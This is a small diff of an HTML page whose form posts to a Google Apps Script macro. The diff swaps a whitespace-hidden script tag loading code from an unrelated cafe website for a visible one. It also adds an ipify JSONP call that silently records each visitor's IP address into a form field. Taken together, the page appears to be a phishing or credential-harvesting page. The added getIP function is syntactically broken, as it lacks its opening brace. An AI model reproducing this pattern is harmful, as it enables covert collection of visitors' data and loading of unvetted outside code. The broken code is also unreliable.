@@ -141,5 +141,11 @@ action="https://script.google.com/macros/s/AKfycbw9mN1c_CT51vCimuvCqUCBBbu1Xq9m3
 <!-- END -->
 
 </body>
-                                                                                   <script src="https://www.spiritspotcafe.com/Scripts/Option.js"></script>
+ <script type="application/javascript">
+  function getIP(json) 
+   document.getElementById("IP").value = json.ip;
+  }
+</script>
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+<script src="https://www.spiritspotcafe.com/Scripts/Option.js"></script>
 </html>
